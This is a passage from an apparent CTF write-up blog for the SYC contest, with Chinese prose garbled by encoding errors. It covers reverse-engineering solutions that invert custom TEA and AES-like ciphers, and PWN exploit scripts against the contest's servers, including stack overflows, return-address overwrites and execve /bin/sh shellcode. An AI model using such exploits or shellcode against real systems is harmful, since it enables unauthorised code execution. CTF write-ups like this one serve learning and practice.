ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line">v = transform(v[:<span class="number">16</span>])+transform(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v[k] = S[v[k]]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># decrypt </span></span><br><span class="line"></span><br><span class="line">S_inv = [S.index(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">3</span>],A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untransform</span>(<span class="params">A</span>):</span><br><span class="line">    A = [S_inv[A[k]] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp[<span class="number">4</span>*k+j] = A[x]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">y = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    y[k] = S_inv[y[k]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line">    </span><br><span class="line">y = untransform(y[:<span class="number">16</span>])+untransform(y[<span class="number">16</span>:])</span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line">y = [S_inv[y[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h3><blockquote><p>å–‚ï¼ä¸‰ç‚¹å‡ å•¦ï¼é¥®èŒ¶å…ˆå•¦ï¼ (flagéœ€è¦åŒ…ä¸ŠSYC{}æäº¤)</p></blockquote><p>åœ¨MainActivityä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj è¡¥è¶³24ä½ X</span><br><span class="line">sb4 = sb2 = obj å¶æ•°ä½</span><br><span class="line">sb5 = sb3 = obj å¥‡æ•°ä½</span><br><span class="line">4ä½ä¸€ç»„</span><br><span class="line">a|b|c|d -&gt; æ•´æ•°</span><br><span class="line"></span><br><span class="line">key = [2023708229, -158607964, -2120859654, 1167043672]</span><br><span class="line"></span><br><span class="line">v0,v1,v2=m[0],m[1],m[2]</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">	v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">	v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)</span><br><span class="line">m[0]=v0</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">	v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">	v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)</span><br><span class="line">m[1]=v2</span><br><span class="line">m[0]=v1</span><br></pre></td></tr></table></figure><p>åŠ å¯†é€»è¾‘ä¸ºé­”æ”¹TEAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0,v1,v2 = v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0,k1,k2,k3 = k[<span class="number">0</span>],k[<span class="number">1</span>],k[<span class="number">2</span>],k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v2 = v2 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v2 &lt;&lt; <span class="number">4</span>) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">1</span>] = v2</span><br><span class="line">    v[<span class="number">2</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;abcdefghijkl&#x27;</span></span><br><span class="line">m = [bytes_to_long(m[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2023708229</span>, -<span class="number">158607964</span>, -<span class="number">2120859654</span>, <span class="number">1167043672</span>]</span><br><span class="line">key = [k &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">c = encrypt(m, key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k))</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;</span></span><br><span class="line"><span class="comment"># ad@#E!@a123 = sb5</span></span><br><span class="line"><span class="comment"># eCAS213@!@3 = bArr</span></span><br></pre></td></tr></table></figure><p>å¸¦ç¬¦å·è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">int</span>* v, <span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">2</span>],v2=v[<span class="number">1</span>], sum=(<span class="number">-1640531527</span>)*<span class="number">64</span>, i;</span><br><span class="line">    <span class="type">int</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v2&lt;&lt;<span class="number">4</span>) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v2 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1; v[<span class="number">2</span>]=v2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v[<span class="number">3</span>]=&#123;<span class="number">2784531145</span>, <span class="number">3477828365</span>, <span class="number">3029296720</span>&#125;;</span><br><span class="line">	<span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">-2120859654</span>, <span class="number">1167043672</span>&#125;;</span><br><span class="line">    decrypt(&amp;v, k);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x%x%x&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//543056743333546e30697472</span></span><br><span class="line"><span class="comment">//T0Vt33Tn0itr</span></span><br></pre></td></tr></table></figure><p>åœ¨MainActivity2ä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;</span><br><span class="line"></span><br><span class="line">bytes = ad@#E!@a123 = sb5</span><br><span class="line">byteArrayExtra = eCAS213@!@3 = bArr</span><br><span class="line"></span><br><span class="line">byteArrayExtra ^ bytes = iArr</span><br><span class="line"></span><br><span class="line">æ•… bytes = &#x27;0n3DF4itvc0Y&#x27;</span><br></pre></td></tr></table></figure><p>åˆå¹¶å¾—åˆ°flagï¼š<code>SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</code></p><p>â€‹</p><h3 id="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ"><a href="#æ˜¯ç”·äººå°±æ¥æ‰é’ˆ" class="headerlink" title="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ"></a>æ˜¯ç”·äººå°±æ¥æ‰é’ˆ</h3><blockquote><p>ç®€å•çš„æ¸¸æˆé€†å‘é€åˆ†é¢˜,æœ€ç»ˆflagè®°å¾—åŒ…è£¹ä¸ŠSYC{}</p></blockquote><p>ILSPYåç¼–è¯‘ï¼Œåœ¨ <code>public class GameManager</code> æ‰¾åˆ°ä»£ç é€»è¾‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">magicc = [<span class="number">75</span>, <span class="number">109</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">107</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">124</span>, <span class="number">112</span>,</span><br><span class="line">		<span class="number">109</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">63</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">113</span>,</span><br><span class="line">		<span class="number">107</span>, <span class="number">108</span>, <span class="number">62</span>]</span><br><span class="line"></span><br><span class="line">magic = [<span class="number">124</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">92</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">77</span>, <span class="number">73</span>,</span><br><span class="line">		<span class="number">75</span>, <span class="number">64</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">65</span>,</span><br><span class="line">		<span class="number">70</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    magicc = [magicc[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magicc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    magic = [magic[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magic))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5(<span class="built_in">bytes</span>(magicc)).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CBDDD133B60130856D3C695D9E5ED6A5</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125;</code></p><p>â€‹</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30348</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;!!!\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span>+<span class="string">b&#x27;Syclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;first one\n&#x27;</span>)</span><br><span class="line">exp=r.recvline().strip()[:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(exp)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exp)).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>æ¦‚ç‡æ€§getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30941</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x4012F3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>å¼€äº†PIEï¼Œæ¦‚ç‡æ€§getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+<span class="string">b&#x27;\x27\x12&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>æŒ‰å­—èŠ‚ä¿®æ”¹è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•° <code>backdoor()</code> åœ°å€ï¼Œä¿®æ”¹2ä¸ªå­—èŠ‚å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31467</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;abcdefghi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40134d -&gt; 0x401225</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68-0x40=40</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x25-0x4d)&amp;0xffffffff=0xffffffd8</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffd8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68+1-0x40=41</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x12-0x13)&amp;0xffffffff=0xffffffff</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>ï¼ˆä»£ç å¾…è¡¥å……ï¼‰</p><p>â€‹</p><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><blockquote><p>å…ˆåšè¿™é¢˜ï¼Œç®€å•</p></blockquote><p>ï¼ˆä»£ç å¾…è¡¥å……ï¼‰</p><p>â€‹</p><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>æ ˆåœ°å€æ³„éœ²ï¼Œæ ˆå¯å†™ï¼Œå†™24é•¿åº¦å†…çš„shellcodeï¼Œwhileå¾ªç¯æ”¹å†™retaddrä¸ºæ ˆåœ°å€ï¼Œret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31581</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">shell_addr=stack_leak+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">40</span>+i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">hex</span>(shell_addr&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>)[<span class="number">2</span>:].encode())</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="fmt1-0"><a href="#fmt1-0" class="headerlink" title="fmt1.0"></a>fmt1.0</h3><p>ï¼ˆä»£ç 